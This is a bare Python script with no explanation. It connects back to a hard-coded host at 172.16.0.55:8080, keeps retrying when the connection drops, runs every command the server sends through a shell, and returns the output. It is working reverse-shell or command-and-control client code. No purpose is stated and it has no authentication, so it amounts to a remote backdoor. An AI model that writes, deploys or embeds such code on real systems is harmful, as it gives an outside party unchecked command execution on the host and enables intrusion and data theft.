import socket
import json
import subprocess
import time

def main():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('172.16.0.55', 8080))

            while True:
                command_str = client.recv(1024).decode()
                if not command_str:
                    break

                command = json.loads(command_str)

                if command["type"] == "command":
                    content = command["content"]
                    print(f"Received command: {content}")
                    result = subprocess.run(content, capture_output=True, text=True, shell=True)
                    output_str = result.stdout + result.stderr
                    print("Command output:\n", output_str)
                    client.sendall(output_str.encode())

        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError):
            print("Server unreachable, retrying in 5 seconds...")
            time.sleep(5)

if __name__ == '__main__':
    main()
